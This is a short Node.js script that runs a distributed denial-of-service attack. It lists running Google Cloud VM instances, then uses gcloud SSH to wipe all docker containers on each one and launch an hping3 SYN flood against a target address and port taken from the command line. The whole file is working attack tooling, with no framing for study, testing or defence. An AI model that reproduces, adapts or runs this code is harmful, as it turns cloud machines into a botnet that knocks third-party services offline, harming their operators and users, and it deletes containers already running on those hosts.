const gcloud = "\"C:\\Program Files (x86)\\Google\\Cloud SDK\\google-cloud-sdk\\bin\\gcloud.cmd\"";


const childProcess = require("child_process");

childProcess.exec(`${gcloud} compute instances list`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }

    console.log("Instances:")
    console.log(stdout);
    let instances = parseInstances(stdout);
    let parameters = getParameters();
    console.log("parameters:");
    console.log(parameters)
    let validationError = validate(instances, parameters)
    if (validationError) {
        console.log("ERROR: " + validationError);
        return;
    }

    startDdos(instances, parameters);
})

function parseInstances(stdout) {
    var rows = stdout.split("\r\n");
    rows.shift();
    return rows.map(row => {
        var cols = row.split(' ').filter(x => x != '');
        return {
            name: cols[0],
            zone: cols[1],
            status: cols[cols.length - 1]
        }
    }).filter(x => x.name && x.status == 'RUNNING');
}

function getParameters() {
    return {
        address: process.argv[2],
        port: Number(process.argv[3]) || 443
    }
}

function validate(instances, parameters) {
    if (!instances)
        return "no VM instances found";
    if (!parameters.address)
        return "specify the address as the first parameter"
}

function startDdos(instances, parameters, index) {
    index ||= 0;
    let inst = instances[index];
    if (!inst)
        return;
    let instanceCommand = `sudo docker rm -f $(sudo docker ps -a -q); sudo docker run --rm -d utkudarilmaz/hping3:latest -S --flood -p ${parameters.port} ${parameters.address} -d 10000`;
    let command = `${gcloud} compute ssh ${inst.name} --zone=${inst.zone} --command=\"${instanceCommand}\"`;
    console.log("EXECUTING COMMAND: " + command);
    childProcess.exec(command, (error, stdout, stderr) => {
        if (error)
            console.log(`error: ${error.message}`);
        else if (stderr)
            console.log(`stderr: ${stderr}`);
        else
            console.log(stdout);
        startDdos(instances, parameters, index + 1);
    })
}

